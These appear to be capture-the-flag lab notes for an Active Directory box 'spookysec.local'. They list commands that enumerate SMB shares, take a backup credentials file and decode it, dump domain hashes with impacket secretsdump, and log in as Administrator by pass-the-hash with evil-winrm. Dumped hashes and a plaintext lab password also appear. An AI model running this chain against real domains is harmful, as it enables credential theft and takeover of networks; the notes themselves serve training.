```
smbclient -U spookysec.local/svc-admin -L //10.10.90.103
```
![[list shares.png]]

```
smbclient -U spookysec.local/svc-admin //10.10.90.103/backup
```
![[connect to backup.png]]


```
get backup_credentials.txt
exit
cat backup_credentials.txt
```
![[get backup creds file.png]]


```
echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 -d
```
![[decode creds.png]]


```
backup@spookysec.local:backup2517860
```

```
python3 /opt/impacket/examples/secretsdump.py spookysec.local/backup:${passw2}@spookysec.local -dc-ip 10.10.90.103 | tee secretsdump.md
```

![[secretsdump start.png]]
![[secretsdump 1.png]]
![[secretsdump 2.png]]
![[secretsdump 3.png]]


**Notable Hashes**
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::

spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::

spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::

**Proofs**
```
evilwinrm -i 10.10.90.103 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```
![[flags.png]]

